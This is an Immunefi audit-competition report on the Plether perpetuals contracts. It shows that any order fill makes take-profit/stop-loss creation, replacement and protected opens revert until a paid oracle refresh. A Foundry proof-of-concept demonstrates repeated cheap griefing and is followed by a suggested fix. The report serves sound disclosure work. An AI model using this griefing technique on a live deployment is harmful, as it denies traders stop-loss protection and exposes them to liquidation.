# \#99655 [SC-Low] Any order fill blocks TP/SL creation, replacement and protected opens until a paid mark refresh

**Submitted on Nov 14th 2026 at 17:01:49 UTC by @DiFors for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99655
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

After the fix for Cecuro MED-28, every path that arms a position protection (take-profit / stop-loss) reads `oracle.getLatestPrice(MarkRefresh)`. That view reverts with `PletherOracle__PriceOutOfOrder` whenever the Oracle's accepted live basket is **older** than the Engine mark. An ordinary order fill puts the protocol into exactly this state: the fill is priced from Pyth's unique historical tick and installs that tick as the Engine mark, but never updates the accepted live basket.

As a result `createPositionProtection`, `replacePositionProtection` and `commitOpenOrderWithProtection` revert after **any** trader's fill, for all traders, until somebody submits a fresh signed live basket through `updateMarkPrice`. The next fill disables them again. With the reference oracle worker (30-second `updateMarkPrice` cadence, root `README.md`), one fill per cycle keeps protection creation unavailable for 29 of every 30 seconds.

## Vulnerability Details

**1. A fill moves the Engine mark ahead of the accepted live basket.**
Order execution resolves a historical basket (`PletherOracle._resolveHistoricalOrderBasket`, L596) through `parsePriceFeedUpdatesUnique`. This path does not write `_acceptedPrices` / `_acceptedBasket`. The Router then installs the historical tick as the Engine mark:

```solidity
// OrderRouterExecutionSidecar.sol L1053-1061
if (result.publishTime > engine_.lastMarkTime()) {
    engine_.updateMarkPrice(result.neutralMarkPrice, result.publishTime);
}
```

The fill tick is the first Pyth tick after `commitTime`, so it is newer than any live basket accepted before the commit. After the fill: `engine.lastMarkTime() > acceptedBasket.publishTime`.

**2. Protection arming rejects that state.**
All three arming paths (`_create` L215, `_replace` L264, `_stageAttached` L443) call:

```solidity
// PositionProtectionBook.sol L862-886 (added by the MED-28 fix)
IPletherOracle.PriceSnapshot memory current = oracle.getLatestPrice(IPletherOracle.PriceMode.MarkRefresh);
```

`getLatestPrice` builds the snapshot with `enforcePublishOrder = true`:

```solidity
// PletherOracle.sol L578 and L878-895
snapshot = _snapshotFromBasket(basket, policy, true);
...
uint64 markTime = engine.lastMarkTime();
if (snapshot.publishTime < markTime) {
    revert PletherOracle__PriceOutOfOrder(snapshot.publishTime, markTime);
}
```

So the call reverts whenever the Engine mark is newer than the accepted basket — the normal state after a fill.

**3. The zero-fee replay cannot repair it; only a paid live refresh does.**
`ORACLE_SYNCHRONIZATION.md` describes an empty live payload that "replays" the accepted basket at zero fee. `updateMarkPrice(new bytes[](0))` hits the same `_snapshotFromBasket(..., true)` check and reverts with the same error. Only a new signed live basket whose publish time is at least the fill tick restores the action.

**Why this is not intended behaviour**

- The Engine mark in this state is valid and *newer*. Nothing is stale or unsafe. The Book itself treats it as a correct arming baseline: a protection attached to an open is armed with exactly this mark after the parent fill — `_arm(parentProtection, ENGINE.lastMarkTime())` (L602).
- The Book's own guard for mark/oracle disagreement is `PositionProtectionBook__OracleMarkAhead` (accepted basket ahead of the Engine). The repository tests cover only that direction, and only by pranking the Router to call the Oracle directly (`PositionProtection.t.sol`, the two `...OracleMarkAhead` expectations near L289 and L2479). That direction cannot occur in production, because all four Router paths that accept a live basket (`updateMarkPrice`, `settleLpEpoch`, `executeLiquidation`, `executeLiquidationBatch` in `OrderLiquidationBatchLogic.sol`) install it in the Engine in the same transaction. The reachable direction (Engine ahead after a fill) is not exercised: the protection fixture opens positions with `vm.prank(router); engine.processOrderTyped(...)` (`BasePerpTest._open`), bypassing the Router and Oracle.
- `CANONICAL_ENTRYPOINTS.md` and `SECURITY.md` list the preconditions for protection creation (Router pause, frozen oracle, freshness, position/queue checks, post-lock collateral). None of them is "no order was filled since the last live refresh".
- The first-party client builds single-call actions with no mark refresh (`packages/perps-aa-client/src/protection.ts` L41-56, L109: `calls: [{ to: book, value: 0n, data }]`).

## Impact Details

- **Stop-loss / take-profit cannot be created, moved, or attached to an open** while the Engine mark is ahead of the accepted basket. This affects every trader, not only the one whose order was filled.
- **Triggerable by anyone, repeatedly, at negligible cost.** One ordinary fill per keeper cycle is enough. In the PoC a $10,000-notional fill costs 4.2 USDG (4.0 USDG execution fee at 0.04% plus the 0.2 USDG keeper bounty). At the release minimum notional of 1,000 USDG that is about 0.5 USDG per 30-second cycle, or 0.4 USDG if the sender executes the order himself, because a self-executed order gets its own bounty back.
- **Happens without an attacker.** On an active market fills are continuous, so with the reference 30-second oracle cadence the three entrypoints are unavailable most of the time. They fail with an oracle ordering error that gives the trader no hint that a mark refresh is required.
- Traders are left without protection exactly when order flow (and usually volatility) is highest. At the release parameters (0.1% maintenance margin, 0.2% initial margin) an unprotected position is liquidated on a small move and loses its liquidation reserve instead of exiting through its stop-loss.
- No funds are stolen. The damage is denial of a core risk-management function (griefing).

A trader can work around it by sending `updateMarkPrice` with fresh Pyth data immediately before the Book call, but the two calls are not atomic for an EOA: any fill that lands in between re-blocks the action.

## Recommendation

When the Engine mark is newer than the accepted live basket, validate trigger geometry against the Engine mark and use `ENGINE.lastMarkTime()` as the arming baseline (the same baseline `afterOrderTerminal` already uses for attached protections), instead of calling the publish-order-enforcing `getLatestPrice`. Alternatively expose a non-reverting Oracle view of the accepted basket and treat "Engine ahead" as synchronized.

## References

- `packages/perps/src/PositionProtectionBook.sol` L215, L264, L443, L602, L862-894
- `packages/perps/src/PletherOracle.sol` L571-580, L596, L878-902
- `packages/perps/src/OrderRouterExecutionSidecar.sol` L1053-1061
- Root `README.md` L137 ("submits `updateMarkPrice` on a configurable 30-second cadence")
- Cecuro report MED-28 remediation note (fix commits `8f6cfd3d`, `81919218`)

## Link to Proof of Concept

https://gist.github.com/DiMetelnyi/d0289d9910b7eb56e2b2b9a2708b1237

## Proof of Concept

The PoC extends the project's own `BasePerpTest`. Every state change goes through the public Router / Book entrypoints (`commitOrder`, `executeOrder`, `updateMarkPrice`, `createPositionProtection`, `replacePositionProtection`, `commitOpenOrderWithProtection`). Only Pyth payloads and the settlement token are mocked, as the competition rules allow.

### Run

```bash
git clone https://github.com/immunefi-team/audit-comp-plether.git
cd audit-comp-plether
git checkout --detach a82d4fefb02768e5b3bddcc97dee371eee24fea8
git submodule update --init --recursive
mkdir -p packages/perps/test/perps/poc
# save the file below as packages/perps/test/perps/poc/ProtectionCreationBlockedAfterFillPoC.t.sol
cd packages/perps
forge test --match-path test/perps/poc/ProtectionCreationBlockedAfterFillPoC.t.sol -vv
```

The package builds with `via_ir = true`, so the first compilation takes several minutes. Verified with forge 1.5.1 and solc 0.8.35.

### Tests

1. `test_CreateProtection_RevertsAfterOwnFill_UntilLiveRefresh` — a trader opens through commit/execute, then `createPositionProtection` reverts with `PletherOracle__PriceOutOfOrder(acceptedTime, markTime)`; the empty-payload replay reverts with the same error; after a fresh live refresh the same call succeeds.
2. `test_ThirdPartyFill_BlocksProtectedOpenAndReplace` — after Bob's ordinary fill, Alice's `commitOpenOrderWithProtection` and Carol's `replacePositionProtection` both revert, although the same protected open succeeded immediately before the fill.
3. `test_ReferenceCadence_OneFillPerCycle_KeepsProtectionCreationBlocked` — three 30-second keeper cycles; the action works right after each keeper refresh and then reverts on every sampled second after one fill (87 of 87 seconds).

### Code

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IPletherOracle} from "@plether/perps/interfaces/IPletherOracle.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {IPositionProtectionViews} from "@plether/perps/interfaces/IPositionProtectionViews.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {console2} from "forge-std/console2.sol";

/// @notice PoC: after ANY ordinary order fill, every protection (TP/SL) creation path reverts with
///         `PletherOracle__PriceOutOfOrder` until somebody pays for a fresh live `updateMarkPrice`.
contract ProtectionCreationBlockedAfterFillPoC is BasePerpTest {

    address private constant ALICE = address(0xA11CE);
    address private constant BOB = address(0xB0B);
    address private constant CAROL = address(0xCA201);
    address private constant ORACLE_KEEPER = address(0x04AC1E);
    address private constant ORDER_KEEPER = address(0xBEEF);

    uint256 private constant MARK = 1e8;
    uint256 private constant SIZE = 10_000e18; // $10,000 notional at a $1.00 mark
    uint256 private constant MARGIN = 2000e6;
    uint256 private constant TAKE_PROFIT = 90_000_000; // LONG take-profit below the mark
    uint256 private constant STOP_LOSS = 110_000_000; // LONG stop-loss above the mark
    uint256 private constant REFERENCE_REFRESH_CADENCE = 30; // seconds, root README "Oracle maintenance"
    uint256 private constant LIVE_TIME = 1_729_283_399 - 1 hours; // live market, outside the FAD window

    IPositionProtectionActions private book;
    IPositionProtectionViews private bookViews;
    uint256 private clientNonce;

    function setUp() public override {
        super.setUp();
        book = IPositionProtectionActions(address(router.positionProtectionBook()));
        bookViews = IPositionProtectionViews(address(router.positionProtectionBook()));
        vm.warp(LIVE_TIME);
        _fundTrader(ALICE, 50_000e6);
        _fundTrader(BOB, 50_000e6);
        _fundTrader(CAROL, 50_000e6);
        _keeperLiveRefresh();
    }

    // 1. A trader's own fill makes "add TP/SL to my position" revert until a paid live refresh
    function test_CreateProtection_RevertsAfterOwnFill_UntilLiveRefresh() public {
        _openThroughRouter(ALICE, SIZE, MARGIN);

        (, , uint64 acceptedTime) = pletherOracle.getAcceptedBasketMark();
        uint64 markTime = engine.lastMarkTime();
        console2.log("accepted live basket time :", acceptedTime);
        console2.log("engine mark time (fill)   :", markTime);
        assertGt(markTime, acceptedTime, "the fill installed a newer mark than the accepted live basket");

        PositionProtectionTypes.PositionProtectionParams memory params = _params(TAKE_PROFIT, STOP_LOSS);
        vm.prank(ALICE);
        vm.expectRevert(
            abi.encodeWithSelector(IPletherOracle.PletherOracle__PriceOutOfOrder.selector, acceptedTime, markTime)
        );
        book.createPositionProtection(params);

        // The documented zero-fee replay of the accepted basket cannot repair it either.
        vm.expectRevert(
            abi.encodeWithSelector(IPletherOracle.PletherOracle__PriceOutOfOrder.selector, acceptedTime, markTime)
        );
        router.updateMarkPrice(new bytes[](0));

        // Only a fresh signed live basket (paid Pyth update) restores the action.
        _keeperLiveRefresh();
        vm.prank(ALICE);
        uint64 protectionId = book.createPositionProtection(params);
        assertEq(bookViews.activePositionProtectionId(ALICE), protectionId, "armed only after the live refresh");
    }

    // 2. A third party's fill blocks other traders' attached opens and stop-loss replacement
    function test_ThirdPartyFill_BlocksProtectedOpenAndReplace() public {
        _openThroughRouter(CAROL, SIZE, MARGIN);
        _keeperLiveRefresh();
        vm.prank(CAROL);
        uint64 carolProtection = book.createPositionProtection(_params(TAKE_PROFIT, STOP_LOSS));

        // Sanity: right after a live refresh ALICE could stage a protected open (state rolled back).
        uint256 snapshot = vm.snapshotState();
        OrderV3Types.OrderRequest memory probe = _request(CfdTypes.Side.LONG, SIZE, MARGIN, false);
        vm.prank(ALICE);
        book.commitOpenOrderWithProtection(probe, _params(TAKE_PROFIT, STOP_LOSS));
        vm.revertToState(snapshot);

        // BOB trades normally. Nobody else does anything.
        _openThroughRouter(BOB, SIZE, MARGIN);

        OrderV3Types.OrderRequest memory request = _request(CfdTypes.Side.LONG, SIZE, MARGIN, false);
        PositionProtectionTypes.PositionProtectionParams memory params = _params(TAKE_PROFIT, STOP_LOSS);
        vm.prank(ALICE);
        vm.expectPartialRevert(IPletherOracle.PletherOracle__PriceOutOfOrder.selector);
        book.commitOpenOrderWithProtection(request, params);

        PositionProtectionTypes.PositionProtectionParams memory tighter = _params(TAKE_PROFIT, STOP_LOSS - 5_000_000);
        vm.prank(CAROL);
        vm.expectPartialRevert(IPletherOracle.PletherOracle__PriceOutOfOrder.selector);
        book.replacePositionProtection(carolProtection, tighter);
    }

    // 3. With the reference 30-second oracle cadence, one fill per cycle keeps protections unavailable
    function test_ReferenceCadence_OneFillPerCycle_KeepsProtectionCreationBlocked() public {
        _openThroughRouter(ALICE, SIZE, MARGIN);

        uint256 blockedSeconds;
        uint256 observedSeconds;
        uint256 bobBalanceBefore = clearinghouse.balanceAssets(BOB);

        for (uint256 cycle; cycle < 3; ++cycle) {
            _keeperLiveRefresh();
            assertTrue(_canCreateProtection(ALICE), "available right after the keeper refresh");

            uint256 cycleStart = vm.getBlockTimestamp();
            _openThroughRouter(BOB, SIZE, MARGIN);

            while (vm.getBlockTimestamp() < cycleStart + REFERENCE_REFRESH_CADENCE) {
                ++observedSeconds;
                if (!_canCreateProtection(ALICE)) {
                    ++blockedSeconds;
                }
                vm.roll(vm.getBlockNumber() + 1);
                vm.warp(vm.getBlockTimestamp() + 1);
            }
        }
        uint256 bobSpentAssets = bobBalanceBefore - clearinghouse.balanceAssets(BOB); // execution fee + keeper bounty

        console2.log("seconds sampled after a fill      :", observedSeconds);
        console2.log("seconds with creation reverting   :", blockedSeconds);
        console2.log("BOB's total cost for 3 fills (6dp):", bobSpentAssets);
        assertEq(blockedSeconds, observedSeconds, "blocked for the whole remainder of every keeper cycle");
    }

    // ---------------------------- helpers ----------------------------

    function _canCreateProtection(address account) private returns (bool ok) {
        PositionProtectionTypes.PositionProtectionParams memory params = _params(TAKE_PROFIT, STOP_LOSS);
        vm.prank(account);
        try book.createPositionProtection(params) returns (uint64 protectionId) {
            vm.prank(account);
            book.cancelPositionProtection(protectionId);
            return true;
        } catch {
            return false;
        }
    }

    /// @dev Reference oracle worker: public `updateMarkPrice` with a fresh signed live basket.
    function _keeperLiveRefresh() private {
        if (vm.getBlockTimestamp() <= engine.lastMarkTime()) {
            vm.roll(vm.getBlockNumber() + 1);
            vm.warp(uint256(engine.lastMarkTime()) + 1);
        }
        bytes[] memory live = new bytes[](1);
        live[0] = abi.encode(MARK);
        vm.prank(ORACLE_KEEPER);
        router.updateMarkPrice(live);
    }

    /// @dev Ordinary trade: public commit, then a keeper executes it at the first Pyth tick after the commit.
    function _openThroughRouter(address account, uint256 size, uint256 margin) private {
        OrderV3Types.OrderRequest memory request = _request(CfdTypes.Side.LONG, size, margin, false);
        vm.prank(account);
        uint64 orderId = router.commitOrder(request);
        bytes[] memory data = _mockPythUpdateData(MARK); // +1 block, +1 second, unique tick at commitTime + 1
        vm.prank(ORDER_KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, data);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "order must execute");
    }

    function _params(uint256 takeProfit, uint256 stopLoss)
        private
        pure
        returns (PositionProtectionTypes.PositionProtectionParams memory params)
    {
        params.takeProfitTriggerPrice = takeProfit;
        params.stopLossTriggerPrice = stopLoss;
        params.closeLimits = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        });
    }

    function _request(CfdTypes.Side side, uint256 size, uint256 margin, bool isClose)
        private
        returns (OrderV3Types.OrderRequest memory request)
    {
        request.clientOrderId = bytes32(uint256(0xC0FFEE00) + (++clientNonce));
        request.side = side;
        request.targetPrice = MARK;
        request.sizeDelta = size;
        request.marginDelta = margin;
        request.isClose = isClose;
        request.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(vm.getBlockTimestamp() + 60),
            executionWindowSeconds: 60,
            allowedExecutionModes: 7,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }
}
```

### Output

```
Ran 3 tests for test/perps/poc/ProtectionCreationBlockedAfterFillPoC.t.sol:ProtectionCreationBlockedAfterFillPoC
[PASS] test_CreateProtection_RevertsAfterOwnFill_UntilLiveRefresh() (gas: 3461317)
Logs:
  accepted live basket time : 1729279799
  engine mark time (fill)   : 1729279800

[PASS] test_ReferenceCadence_OneFillPerCycle_KeepsProtectionCreationBlocked() (gas: 29687579)
Logs:
  seconds sampled after a fill      : 87
  seconds with creation reverting   : 87
  BOB's total cost for 3 fills (6dp): 12600022

[PASS] test_ThirdPartyFill_BlocksProtectedOpenAndReplace() (gas: 7904125)
Suite result: ok. 3 passed; 0 failed; 0 skipped
```
